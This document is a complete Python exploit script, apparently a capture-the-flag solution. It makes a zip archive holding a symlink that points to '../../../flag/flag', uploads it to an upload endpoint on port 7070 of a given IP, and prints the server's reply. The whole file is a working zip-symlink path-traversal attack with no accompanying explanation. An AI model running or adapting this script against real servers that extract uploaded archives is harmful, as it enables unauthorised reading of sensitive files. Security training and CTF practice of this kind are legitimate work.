#!/usr/bin/env python3

import os
import tempfile
import subprocess
import requests
import sys

def create_symlink_zip():
    try:
        with tempfile.TemporaryDirectory() as tmpdir:
            os.chdir(tmpdir)
            os.symlink("../../../flag/flag", "malv.txt")
            zip_path = os.path.join(tmpdir, "vuln.zip")
            subprocess.run(["zip", "--symlinks", "vuln.zip", "malv.txt"], check=True)
            with open(zip_path, "rb") as f:
                return f.read()
    except Exception as e:
        print(f"[-] Error creating symlink zip: {e}")
        sys.exit(1)

def send_zip(zip_bytes, ip):
    try:
        target_url = f'http://{ip}:7070/upload'
        files = {'file': ('vuln.zip', zip_bytes, 'application/zip')}
        response = requests.post(target_url, files=files)
        return response
    except Exception as e:
        print(f"[-] Error sending zip: {e}")
        sys.exit(1)

def main():
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <ip>")
        sys.exit(1)
    
    ip = sys.argv[1]
    
    try:
        print("[+] Creating symlink zip payload...")
        zip_payload = create_symlink_zip()
        print(f"[+] Sending payload to {ip}...")
        resp = send_zip(zip_payload, ip)
        
        print(f"[+] Status code: {resp.status_code}")
        print("[+] Response body:")
        print(resp.text)
    except Exception as e:
        print(f"[-] Error in main: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()